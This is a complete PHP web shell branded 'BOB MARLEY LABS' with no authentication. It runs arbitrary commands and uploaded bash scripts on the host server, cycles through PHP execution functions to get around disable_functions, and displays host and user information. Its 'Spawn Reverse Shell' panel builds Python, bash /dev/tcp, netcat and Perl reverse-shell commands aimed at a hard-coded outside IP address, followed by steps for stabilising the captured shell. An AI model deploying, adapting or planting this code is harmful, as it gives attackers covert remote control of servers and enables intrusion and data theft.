<?php
/**
 * TERMINAL with disable_functions Bypass
 * BOB MARLEY LABS
 * 
 * Provides proper TTY-like terminal via web interface
 */

@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);

session_start();

// Initialize session variables
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = array();
}

$current_dir = $_SESSION['cwd'];

// ============================================
// EXECUTION BYPASS ENGINE
// ============================================

function executeCmd($cmd, $cwd) {
    $output = '';
    $method = 'none';
    
    // Wrap command with cd
    $full_cmd = "cd " . escapeshellarg($cwd) . " 2>/dev/null; " . $cmd . " 2>&1; echo -n '[EXIT:'$?']'";
    
    // Method 1: proc_open (most reliable)
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', @ini_get('disable_functions')))) {
        $descriptors = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
        );
        
        $process = @proc_open($full_cmd, $descriptors, $pipes, $cwd);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $output .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            $method = 'proc_open';
            return ['output' => $output, 'method' => $method];
        }
    }
    
    // Method 2: popen
    if (function_exists('popen') && !in_array('popen', explode(',', @ini_get('disable_functions')))) {
        $fp = @popen($full_cmd, 'r');
        if ($fp) {
            while (!feof($fp)) {
                $output .= fread($fp, 4096);
            }
            pclose($fp);
            $method = 'popen';
            return ['output' => $output, 'method' => $method];
        }
    }
    
    // Method 3: shell_exec
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', @ini_get('disable_functions')))) {
        $output = @shell_exec($full_cmd);
        if ($output !== null) {
            $method = 'shell_exec';
            return ['output' => $output, 'method' => $method];
        }
    }
    
    // Method 4: exec
    if (function_exists('exec') && !in_array('exec', explode(',', @ini_get('disable_functions')))) {
        $output_arr = [];
        @exec($full_cmd, $output_arr);
        if (!empty($output_arr)) {
            $output = implode("\n", $output_arr);
            $method = 'exec';
            return ['output' => $output, 'method' => $method];
        }
    }
    
    // Method 5: system
    if (function_exists('system') && !in_array('system', explode(',', @ini_get('disable_functions')))) {
        ob_start();
        @system($full_cmd);
        $output = ob_get_clean();
        if ($output) {
            $method = 'system';
            return ['output' => $output, 'method' => $method];
        }
    }
    
    // Method 6: passthru
    if (function_exists('passthru') && !in_array('passthru', explode(',', @ini_get('disable_functions')))) {
        ob_start();
        @passthru($full_cmd);
        $output = ob_get_clean();
        if ($output) {
            $method = 'passthru';
            return ['output' => $output, 'method' => $method];
        }
    }
    
    return ['output' => '[ERROR] All execution methods failed', 'method' => 'none'];
}

// ============================================
// COMMAND PROCESSING
// ============================================

// Script mode - execute multi-line script
if (isset($_POST['script'])) {
    $script = $_POST['script'];
    $response = array();
    
    // Save script to temp file
    $script_file = '/tmp/.term_' . md5(uniqid()) . '.sh';
    @file_put_contents($script_file, "#!/bin/bash\ncd " . escapeshellarg($current_dir) . "\n" . $script);
    @chmod($script_file, 0755);
    
    // Execute script
    $result = executeCmd("bash " . escapeshellarg($script_file), $current_dir);
    
    // Clean up
    @unlink($script_file);
    
    $response['output'] = $result['output'];
    $response['cwd'] = $current_dir;
    $response['method'] = $result['method'] . ' (script)';
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $response = array();
    
    // Add to history
    if (!empty($cmd) && $cmd != end($_SESSION['history'])) {
        $_SESSION['history'][] = $cmd;
        if (count($_SESSION['history']) > 100) {
            array_shift($_SESSION['history']);
        }
    }
    
    // Handle built-in commands
    if (preg_match('/^cd\s+(.+)$/i', $cmd, $matches)) {
        $new_dir = trim($matches[1]);
        
        // Expand ~ to home directory
        if ($new_dir == '~') {
            $new_dir = getenv('HOME') ?: '/home/' . get_current_user();
        }
        
        // Handle relative paths
        if ($new_dir[0] != '/') {
            $new_dir = $current_dir . '/' . $new_dir;
        }
        
        // Resolve . and ..
        $new_dir = realpath($new_dir);
        
        if ($new_dir && is_dir($new_dir)) {
            $_SESSION['cwd'] = $new_dir;
            $response['output'] = '';
            $response['cwd'] = $new_dir;
            $response['method'] = 'builtin';
        } else {
            $response['output'] = "cd: $new_dir: No such directory";
            $response['cwd'] = $current_dir;
            $response['method'] = 'builtin';
        }
    } else {
        // Execute command
        $result = executeCmd($cmd, $current_dir);
        
        // Extract exit code if present
        if (preg_match('/\[EXIT:(\d+)\]$/', $result['output'], $matches)) {
            $exit_code = $matches[1];
            $result['output'] = preg_replace('/\[EXIT:\d+\]$/', '', $result['output']);
        } else {
            $exit_code = 0;
        }
        
        $response['output'] = $result['output'];
        $response['cwd'] = $current_dir;
        $response['method'] = $result['method'];
        $response['exit_code'] = $exit_code;
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// Get system info
if (isset($_GET['sysinfo'])) {
    $info = array(
        'hostname' => @gethostname(),
        'user' => @get_current_user(),
        'uid' => @getmyuid(),
        'gid' => @getmygid(),
        'os' => PHP_OS,
        'php_version' => phpversion(),
        'disabled_functions' => @ini_get('disable_functions'),
        'cwd' => $current_dir,
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
    );
    
    header('Content-Type: application/json');
    echo json_encode($info);
    exit;
}

// Get command history
if (isset($_GET['history'])) {
    header('Content-Type: application/json');
    echo json_encode($_SESSION['history']);
    exit;
}

// Clear session
if (isset($_GET['clear'])) {
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = array();
    header('Content-Type: application/json');
    echo json_encode(['status' => 'cleared']);
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal - BOB MARLEY LABS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #0f0;
            overflow: hidden;
        }
        
        #terminal-container {
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        #header {
            background: #1a1a1a;
            border-bottom: 2px solid #0f0;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        #header h1 {
            font-size: 1.2em;
            color: #0f0;
        }
        
        #sysinfo {
            font-size: 0.8em;
            color: #0f0;
        }
        
        #terminal-output {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            background: #000;
        }
        
        #terminal-output::-webkit-scrollbar {
            width: 10px;
        }
        
        #terminal-output::-webkit-scrollbar-track {
            background: #111;
        }
        
        #terminal-output::-webkit-scrollbar-thumb {
            background: #0f0;
        }
        
        .terminal-line {
            margin: 5px 0;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 14px;
            line-height: 1.4;
        }
        
        .prompt {
            color: #0f0;
            font-weight: bold;
        }
        
        .command {
            color: #fff;
        }
        
        .output {
            color: #0f0;
        }
        
        .error {
            color: #f00;
        }
        
        .method-badge {
            display: inline-block;
            padding: 2px 6px;
            background: #0f0;
            color: #000;
            font-size: 0.7em;
            font-weight: bold;
            margin-left: 5px;
        }
        
        #input-container {
            display: flex;
            padding: 10px 20px;
            background: #1a1a1a;
            border-top: 2px solid #0f0;
            align-items: center;
        }
        
        #prompt-text {
            color: #0f0;
            font-weight: bold;
            margin-right: 10px;
            white-space: nowrap;
        }
        
        #command-input {
            flex: 1;
            background: #000;
            border: 1px solid #0f0;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 8px;
            outline: none;
        }
        
        #command-input:focus {
            border-color: #0f0;
            box-shadow: 0 0 10px #0f0;
        }
        
        .blink {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        
        .loading {
            color: #ff0;
        }
    </style>
</head>
<body>
    <div id="terminal-container">
        <div id="header">
            <h1> TERMINAL - BOB MARLEY LABS</h1>
            <div id="sysinfo">Loading...</div>
        </div>
        
        <div id="terminal-output"></div>
        
        <div id="input-container">
            <span id="prompt-text">user@host:~$</span>
            <input type="text" id="command-input" autofocus autocomplete="off" placeholder="Enter command...">
            <button id="toggle-script" style="margin-left: 10px; padding: 8px 15px; background: #0f0; color: #000; border: none; cursor: pointer; font-family: monospace; font-weight: bold;">📝 SCRIPT</button>
            <button id="spawn-shell" style="margin-left: 10px; padding: 8px 15px; background: #ff0; color: #000; border: none; cursor: pointer; font-family: monospace; font-weight: bold;">🚀 SPAWN SHELL</button>
        </div>
        <div id="script-container" style="display: none; padding: 10px 20px; background: #1a1a1a; border-top: 2px solid #0f0;">
            <div style="margin-bottom: 10px; color: #0f0;">
                <strong>📝 SCRIPT MODE</strong> - Paste multi-line commands or exploit scripts
            </div>
            <textarea id="script-input" rows="10" style="width: 100%; background: #000; border: 1px solid #0f0; color: #fff; font-family: 'Courier New', monospace; font-size: 14px; padding: 10px; resize: vertical;"></textarea>
            <div style="margin-top: 10px; display: flex; gap: 10px;">
                <button id="run-script" style="padding: 8px 20px; background: #0f0; color: #000; border: none; cursor: pointer; font-family: monospace; font-weight: bold;">▶ RUN SCRIPT</button>
                <button id="cancel-script" style="padding: 8px 20px; background: #f00; color: #fff; border: none; cursor: pointer; font-family: monospace; font-weight: bold;">✖ CANCEL</button>
                <span style="color: #888; margin-left: auto; align-self: center; font-size: 0.9em;">Tip: Runs all commands in a single bash session</span>
            </div>
        </div>
        
        <div id="shell-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; overflow-y: auto;">
            <div style="max-width: 900px; margin: 50px auto; background: #1a1a1a; border: 3px solid #ff0; padding: 30px;">
                <h2 style="color: #ff0; margin-bottom: 20px;">🚀 SPAWN REVERSE SHELL</h2>
                <div style="color: #0f0; margin-bottom: 20px; line-height: 1.8;">
                    <p><strong>Why you need this:</strong></p>
                    <p>✓ Interactive exploits with menus (LinPEAS, privilege escalation tools)</p>
                    <p>✓ Tools that need persistent shell (sudo, su, interactive prompts)</p>
                    <p>✓ Full TTY for complex exploits</p>
                    <p>✓ Real terminal experience</p>
                </div>
                
                <div style="background: #000; border: 2px solid #ff0; padding: 20px; margin: 20px 0;">
                    <div style="color: #ff0; font-weight: bold; margin-bottom: 15px;">STEP 1: Start listener on YOUR machine</div>
                    <div style="background: #1a1a1a; padding: 10px; margin-bottom: 10px; border: 1px solid #333;">
                        <code style="color: #0f0; font-size: 14px;">nc -lvnp 15</code>
                        <button onclick="copyToClipboard('nc -lvnp 15')" style="float: right; padding: 5px 10px; background: #0f0; color: #000; border: none; cursor: pointer; font-size: 11px;">COPY</button>
                    </div>
                    
                    <div style="color: #ff0; font-weight: bold; margin: 20px 0 15px 0;">STEP 2: Edit IP/PORT below, then click SPAWN</div>
                    <div style="margin-bottom: 10px;">
                        <label style="color: #0f0; display: block; margin-bottom: 5px;">Your IP:</label>
                        <input type="text" id="shell-ip" value="31.57.184.148" style="width: 100%; padding: 10px; background: #000; border: 1px solid #0f0; color: #fff; font-family: monospace; font-size: 14px;">
                    </div>
                    <div style="margin-bottom: 10px;">
                        <label style="color: #0f0; display: block; margin-bottom: 5px;">Your Port:</label>
                        <input type="text" id="shell-port" value="15" style="width: 100%; padding: 10px; background: #000; border: 1px solid #0f0; color: #fff; font-family: monospace; font-size: 14px;">
                    </div>
                    
                    <div style="color: #ff0; font-weight: bold; margin: 20px 0 15px 0;">Choose Method:</div>
                    
                    <button onclick="spawnShell('python')" style="width: 100%; padding: 12px; margin: 5px 0; background: #0f0; color: #000; border: none; cursor: pointer; font-family: monospace; font-weight: bold; text-align: left;">
                        ⭐ Python PTY (BEST - Full interactive with TTY)
                    </button>
                    
                    <button onclick="spawnShell('bash')" style="width: 100%; padding: 12px; margin: 5px 0; background: #0f0; color: #000; border: none; cursor: pointer; font-family: monospace; font-weight: bold; text-align: left;">
                        🔥 Bash TCP (Fast, built-in)
                    </button>
                    
                    <button onclick="spawnShell('netcat')" style="width: 100%; padding: 12px; margin: 5px 0; background: #0f0; color: #000; border: none; cursor: pointer; font-family: monospace; font-weight: bold; text-align: left;">
                        🌐 Netcat mkfifo (Reliable)
                    </button>
                    
                    <button onclick="spawnShell('perl')" style="width: 100%; padding: 12px; margin: 5px 0; background: #0f0; color: #000; border: none; cursor: pointer; font-family: monospace; font-weight: bold; text-align: left;">
                        💎 Perl (Stable)
                    </button>
                </div>
                
                <div style="background: #000; border: 2px solid #0f0; padding: 15px; margin: 20px 0;">
                    <div style="color: #0f0; font-weight: bold; margin-bottom: 10px;">STEP 3: Stabilize shell (after connection)</div>
                    <div style="color: #888; font-size: 13px; line-height: 1.6;">
                        On YOUR machine (in the reverse shell):<br>
                        1. Press <strong style="color: #ff0;">CTRL+Z</strong> (backgrounds shell)<br>
                        2. Type: <code style="color: #0f0;">stty raw -echo; fg</code><br>
                        3. Press <strong style="color: #ff0;">ENTER</strong> twice<br>
                        4. Type: <code style="color: #0f0;">export TERM=xterm</code><br>
                        5. Now you have full TTY - run your exploits!
                    </div>
                </div>
                
                <div style="margin-top: 20px; text-align: center;">
                    <button id="close-shell-modal" style="padding: 10px 30px; background: #f00; color: #fff; border: none; cursor: pointer; font-family: monospace; font-weight: bold;">✖ CLOSE</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let historyIndex = -1;
        let commandHistory = [];
        let currentCwd = '';
        let currentUser = 'user';
        let currentHost = 'host';
        
        const output = document.getElementById('terminal-output');
        const input = document.getElementById('command-input');
        const promptText = document.getElementById('prompt-text');
        const sysinfo = document.getElementById('sysinfo');
        const scriptContainer = document.getElementById('script-container');
        const scriptInput = document.getElementById('script-input');
        const inputContainer = document.getElementById('input-container');
        const toggleScriptBtn = document.getElementById('toggle-script');
        const runScriptBtn = document.getElementById('run-script');
        const cancelScriptBtn = document.getElementById('cancel-script');
        const spawnShellBtn = document.getElementById('spawn-shell');
        const shellModal = document.getElementById('shell-modal');
        const closeShellModalBtn = document.getElementById('close-shell-modal');
        
        // Load system info
        function loadSysInfo() {
            fetch('?sysinfo=1')
                .then(r => r.json())
                .then(data => {
                    currentUser = data.user;
                    currentHost = data.hostname;
                    currentCwd = data.cwd;
                    
                    sysinfo.innerHTML = `${data.user}@${data.hostname} | ${data.os} | PHP ${data.php_version}`;
                    updatePrompt();
                    
                    // Welcome message
                    addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
                    addOutput('  TERMINAL - BOB MARLEY LABS', 'output');
                    addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
                    addOutput('', 'output');
                    addOutput(`User:     ${data.user} (UID: ${data.uid}, GID: ${data.gid})`, 'output');
                    addOutput(`Host:     ${data.hostname}`, 'output');
                    addOutput(`OS:       ${data.os}`, 'output');
                    addOutput(`PHP:      ${data.php_version}`, 'output');
                    addOutput(`Server:   ${data.server_ip}`, 'output');
                    addOutput(`Client:   ${data.client_ip}`, 'output');
                    addOutput(`CWD:      ${data.cwd}`, 'output');
                    
                    if (data.disabled_functions) {
                        addOutput('', 'output');
                        addOutput('⚠️  Disabled Functions:', 'error');
                        addOutput(data.disabled_functions, 'error');
                    }
                    
                    addOutput('', 'output');
                    addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
                    addOutput('Type commands below. Use arrow keys for history.', 'output');
                    addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
                    addOutput('', 'output');
                });
        }
        
        function updatePrompt() {
            const shortCwd = currentCwd.replace(/^\/home\/[^\/]+/, '~');
            promptText.textContent = `${currentUser}@${currentHost}:${shortCwd}$`;
        }
        
        function addOutput(text, className = 'output') {
            const line = document.createElement('div');
            line.className = `terminal-line ${className}`;
            line.textContent = text;
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }
        
        function addCommand(cmd) {
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="prompt">${promptText.textContent}</span> <span class="command">${escapeHtml(cmd)}</span>`;
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function executeCommand(cmd) {
            if (!cmd.trim()) return;
            
            addCommand(cmd);
            
            // Add to history
            commandHistory.push(cmd);
            historyIndex = commandHistory.length;
            
            // Show loading
            const loadingLine = document.createElement('div');
            loadingLine.className = 'terminal-line loading';
            loadingLine.textContent = '⏳ Executing...';
            output.appendChild(loadingLine);
            output.scrollTop = output.scrollHeight;
            
            // Send command
            const formData = new FormData();
            formData.append('cmd', cmd);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                // Remove loading line
                loadingLine.remove();
                
                // Show output
                if (data.output) {
                    const lines = data.output.split('\n');
                    lines.forEach(line => {
                        addOutput(line, data.exit_code != 0 ? 'error' : 'output');
                    });
                }
                
                // Show method badge
                if (data.method && data.method != 'builtin') {
                    const badge = document.createElement('div');
                    badge.className = 'terminal-line';
                    badge.innerHTML = `<span class="method-badge">${data.method}</span>`;
                    output.appendChild(badge);
                }
                
                // Update CWD
                if (data.cwd) {
                    currentCwd = data.cwd;
                    updatePrompt();
                }
                
                output.scrollTop = output.scrollHeight;
            })
            .catch(err => {
                loadingLine.remove();
                addOutput('❌ Error: ' + err.message, 'error');
            });
        }
        
        // Input handling
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const cmd = input.value;
                input.value = '';
                executeCommand(cmd);
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    input.value = commandHistory[historyIndex] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    input.value = commandHistory[historyIndex] || '';
                } else {
                    historyIndex = commandHistory.length;
                    input.value = '';
                }
            } else if (e.key === 'Tab') {
                e.preventDefault();
                // Could implement tab completion here
            } else if (e.key === 'l' && e.ctrlKey) {
                e.preventDefault();
                output.innerHTML = '';
            }
        });
        
        // Copy to clipboard helper
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('Copied to clipboard!');
            });
        }
        window.copyToClipboard = copyToClipboard;
        
        // Spawn shell function
        function spawnShell(method) {
            const ip = document.getElementById('shell-ip').value;
            const port = document.getElementById('shell-port').value;
            
            if (!ip || !port) {
                alert('Please enter IP and Port');
                return;
            }
            
            let cmd = '';
            
            switch(method) {
                case 'python':
                    cmd = `python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &`;
                    break;
                case 'bash':
                    cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1 &`;
                    break;
                case 'netcat':
                    cmd = `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${port} >/tmp/f &`;
                    break;
                case 'perl':
                    cmd = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &`;
                    break;
            }
            
            // Close modal
            shellModal.style.display = 'none';
            
            // Execute command
            addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
            addOutput('🚀 SPAWNING REVERSE SHELL', 'output');
            addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
            addOutput(`Method: ${method}`, 'output');
            addOutput(`Target: ${ip}:${port}`, 'output');
            addOutput('', 'output');
            addOutput('⏳ Spawning shell in background...', 'loading');
            
            const formData = new FormData();
            formData.append('cmd', cmd);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                addOutput('', 'output');
                addOutput('✓ Shell spawned! Check your listener.', 'output');
                addOutput('', 'output');
                addOutput('If you see a connection, stabilize it:', 'output');
                addOutput('  1. Press CTRL+Z', 'output');
                addOutput('  2. Type: stty raw -echo; fg', 'output');
                addOutput('  3. Press ENTER twice', 'output');
                addOutput('  4. Type: export TERM=xterm', 'output');
                addOutput('', 'output');
                addOutput('Now you have full interactive shell for exploits!', 'output');
                addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
                addOutput('', 'output');
            });
        }
        window.spawnShell = spawnShell;
        
        // Spawn shell button
        spawnShellBtn.addEventListener('click', function() {
            shellModal.style.display = 'block';
        });
        
        closeShellModalBtn.addEventListener('click', function() {
            shellModal.style.display = 'none';
        });
        
        // Script mode toggle
        toggleScriptBtn.addEventListener('click', function() {
            if (scriptContainer.style.display === 'none') {
                scriptContainer.style.display = 'block';
                inputContainer.style.display = 'none';
                scriptInput.focus();
            } else {
                scriptContainer.style.display = 'none';
                inputContainer.style.display = 'flex';
                input.focus();
            }
        });
        
        cancelScriptBtn.addEventListener('click', function() {
            scriptContainer.style.display = 'none';
            inputContainer.style.display = 'flex';
            input.focus();
        });
        
        runScriptBtn.addEventListener('click', function() {
            const script = scriptInput.value.trim();
            if (!script) return;
            
            // Show script in output
            addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
            addOutput('📝 EXECUTING SCRIPT:', 'output');
            addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
            script.split('\n').forEach(line => {
                if (line.trim()) addOutput('  ' + line, 'command');
            });
            addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
            addOutput('', 'output');
            
            // Show loading
            const loadingLine = document.createElement('div');
            loadingLine.className = 'terminal-line loading';
            loadingLine.textContent = '⏳ Running script...';
            output.appendChild(loadingLine);
            output.scrollTop = output.scrollHeight;
            
            // Send script
            const formData = new FormData();
            formData.append('script', script);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                loadingLine.remove();
                
                if (data.output) {
                    const lines = data.output.split('\n');
                    lines.forEach(line => {
                        addOutput(line, 'output');
                    });
                }
                
                if (data.method) {
                    const badge = document.createElement('div');
                    badge.className = 'terminal-line';
                    badge.innerHTML = `<span class="method-badge">${data.method}</span>`;
                    output.appendChild(badge);
                }
                
                addOutput('', 'output');
                addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
                addOutput('✓ Script execution complete', 'output');
                addOutput('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'output');
                addOutput('', 'output');
                
                // Clear script input
                scriptInput.value = '';
                
                // Back to command mode
                scriptContainer.style.display = 'none';
                inputContainer.style.display = 'flex';
                input.focus();
                
                output.scrollTop = output.scrollHeight;
            })
            .catch(err => {
                loadingLine.remove();
                addOutput('❌ Script error: ' + err.message, 'error');
                scriptContainer.style.display = 'none';
                inputContainer.style.display = 'flex';
            });
        });
        
        // Keep focus on input
        document.addEventListener('click', (e) => {
            if (!scriptContainer.contains(e.target) && scriptContainer.style.display === 'none') {
                input.focus();
            }
        });
        
        // Initialize
        loadSysInfo();
        input.focus();
    </script>
</body>
</html>
